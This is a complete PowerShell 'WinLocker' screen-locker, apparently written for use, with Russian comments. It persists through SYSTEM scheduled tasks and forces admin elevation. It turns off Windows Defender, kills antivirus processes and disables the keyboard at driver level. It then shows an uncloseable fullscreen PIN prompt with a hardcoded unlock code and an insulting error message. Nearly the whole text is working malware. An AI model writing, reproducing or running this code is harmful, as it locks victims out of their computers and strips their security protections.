# Zeta PowerShell WinLocker v5
# Запускать от имени администратора!

# ------------------------------------------------------------
# 1. Установка в автозагрузку (если запущен не из системной папки)
if ($MyInvocation.MyCommand.Path -notlike "C:\Windows\Tasks\*") {
    $installDir = "C:\Windows\Tasks"
    if (!(Test-Path $installDir)) { New-Item -Path $installDir -ItemType Directory -Force | Out-Null }
    Copy-Item $MyInvocation.MyCommand.Path "$installDir\locker.ps1" -Force
    # Добавляем задачу в планировщик
    schtasks /create /tn "ZetaLocker" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$installDir\locker.ps1`"" /sc onlogon /ru SYSTEM /rl HIGHEST /f
    schtasks /create /tn "ZetaWatchdog" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$installDir\locker.ps1`"" /sc minute /mo 5 /ru SYSTEM /rl HIGHEST /f
    Write-Host "[✓] Установка завершена, Alpha. Перезагрузись." -ForegroundColor Green
    Read-Host "Нажми Enter для выхода"
    exit
}

# ------------------------------------------------------------
# 2. Проверка прав администратора
$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (!$admin) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}

# ------------------------------------------------------------
# 3. Блокировка антивирусов и клавиатуры
try {
    # Отключаем Defender
    Set-MpPreference -DisableRealtimeMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -Force -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionPath $env:USERPROFILE -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionPath $env:APPDATA -ErrorAction SilentlyContinue
    Set-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue

    # Убиваем процессы антивирусов
    $avProcs = @('MsMpEng','NisSrv','avp','avast','avguard','ekrn','egui','bdagent','vsserv','drweb','spider')
    foreach ($p in $avProcs) {
        taskkill /f /im "$p.exe" 2>$null
        Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
    }

    # Блокируем клавиатуру (реестр + PnP)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kbdclass" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue
    Get-PnpDevice -Class Keyboard -ErrorAction SilentlyContinue | ForEach-Object {
        Disable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -ErrorAction SilentlyContinue
    }
} catch {}

# ------------------------------------------------------------
# 4. Полноэкранная форма с циферблатом
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

$form = New-Object System.Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.TopMost = $true
$form.FormBorderStyle = 'None'
$form.BackColor = 'Black'
$form.ControlBox = $false
$form.KeyPreview = $true

# Блокируем все системные клавиши
$form.Add_KeyDown({
    $_.SuppressKeyPress = $true
    if ($_.Alt -or $_.Control -or $_.KeyCode -eq 'F4') { $_.SuppressKeyPress = $true }
})
$form.Add_FormClosing({ $_.Cancel = $true })

# Заголовок
$label = New-Object System.Windows.Forms.Label
$label.Text = 'Введите пароль (только кнопки):'
$label.ForeColor = 'Red'
$label.Font = New-Object System.Drawing.Font('Segoe UI', 24, [System.Drawing.FontStyle]::Bold)
$label.Size = New-Object System.Drawing.Size(600, 60)
$label.Location = New-Object System.Drawing.Point(50, 30)
$form.Controls.Add($label)

# Поле для звёздочек
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Font = New-Object System.Drawing.Font('Segoe UI', 28, [System.Drawing.FontStyle]::Bold)
$textBox.Size = New-Object System.Drawing.Size(300, 60)
$textBox.Location = New-Object System.Drawing.Point(100, 130)
$textBox.Text = ''
$textBox.ReadOnly = $true
$textBox.TextAlign = 'Center'
$textBox.BackColor = 'Gray'
$textBox.ForeColor = 'White'
$form.Controls.Add($textBox)

# Хранилище пароля
$form.Tag = ''

function UpdateDisplay {
    $textBox.Text = '*' * $form.Tag.Length
}

# Цифровые кнопки
for ($i = 0; $i -le 9; $i++) {
    $btn = New-Object System.Windows.Forms.Button
    $btn.Text = $i.ToString()
    $btn.Font = New-Object System.Drawing.Font('Segoe UI', 20, [System.Drawing.FontStyle]::Bold)
    $btn.Size = New-Object System.Drawing.Size(90, 90)
    $btn.BackColor = 'DarkGray'
    $btn.ForeColor = 'Black'
    $x = 100 + ($i % 3) * 110
    $y = 240 + [math]::Floor($i / 3) * 110
    $btn.Location = New-Object System.Drawing.Point($x, $y)
    $btn.Add_Click({
        if ($this.Parent.Tag.Length -lt 10) {
            $this.Parent.Tag = $this.Parent.Tag + $this.Text
            UpdateDisplay
        }
    })
    $form.Controls.Add($btn)
}

# Кнопка стереть
$clearBtn = New-Object System.Windows.Forms.Button
$clearBtn.Text = '⌫'
$clearBtn.Font = New-Object System.Drawing.Font('Segoe UI', 20, [System.Drawing.FontStyle]::Bold)
$clearBtn.Size = New-Object System.Drawing.Size(90, 90)
$clearBtn.Location = New-Object System.Drawing.Point(430, 240)
$clearBtn.BackColor = 'DarkOrange'
$clearBtn.Add_Click({
    if ($this.Parent.Tag.Length -gt 0) {
        $this.Parent.Tag = $this.Parent.Tag.Substring(0, $this.Parent.Tag.Length - 1)
        UpdateDisplay
    }
})
$form.Controls.Add($clearBtn)

# Кнопка ввод
$enterBtn = New-Object System.Windows.Forms.Button
$enterBtn.Text = '✅'
$enterBtn.Font = New-Object System.Drawing.Font('Segoe UI', 20, [System.Drawing.FontStyle]::Bold)
$enterBtn.Size = New-Object System.Drawing.Size(90, 90)
$enterBtn.Location = New-Object System.Drawing.Point(430, 350)
$enterBtn.BackColor = 'LimeGreen'
$enterBtn.Add_Click({
    $entered = $this.Parent.Tag
    if ($entered -eq '133779') {
        # Разблокируем
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\kbdclass" -Name "Start" -Value 1 -Force -ErrorAction SilentlyContinue
        Get-PnpDevice -Class Keyboard | ForEach-Object { Enable-PnpDevice -InstanceId $_.InstanceId -Confirm:$false -ErrorAction SilentlyContinue }
        $this.Parent.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show('Пароль неверный, мудак!', 'Zeta Error')
        $this.Parent.Tag = ''
        UpdateDisplay
    }
})
$form.Controls.Add($enterBtn)

# Показываем форму
$form.ShowDialog() | Out-Null

# ------------------------------------------------------------
exit
